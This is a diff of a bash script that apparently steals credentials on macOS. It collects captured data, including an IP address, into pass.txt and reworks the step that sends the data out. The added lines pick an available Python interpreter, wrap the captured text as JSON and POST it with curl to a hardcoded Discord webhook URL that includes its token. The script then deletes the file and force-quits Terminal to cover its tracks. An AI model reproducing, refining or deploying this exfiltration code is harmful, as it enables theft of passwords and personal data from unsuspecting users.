@@ -48,14 +48,24 @@ capture="${capture}ipaddress=${ipaddress}"
 # Save the captured information to pass.txt
 echo -e "$capture" > pass.txt
 
-# Send captured data to the Discord webhook using Python for proper JSON formatting
-if [[ -f pass.txt ]]; then
-    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
-    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
-    rm pass.txt
+# Determine which Python to use (prefer python3)
+if command -v python3 &>/dev/null; then
+    PYTHON=python3
+elif command -v python &>/dev/null; then
+    PYTHON=python
 else
-    echo "Error: pass.txt not found" > error.txt
+    echo "Error: Python is not installed."
+    exit 1
 fi
+
+# Generate JSON payload using the available Python interpreter.
+payload=$($PYTHON -c 'import sys, json; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
+
+# Send captured data to the Discord webhook using curl
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
+curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
+
+rm pass.txt
 
 # Force-quit Terminal without confirmation
 killall Terminal 2>/dev/null
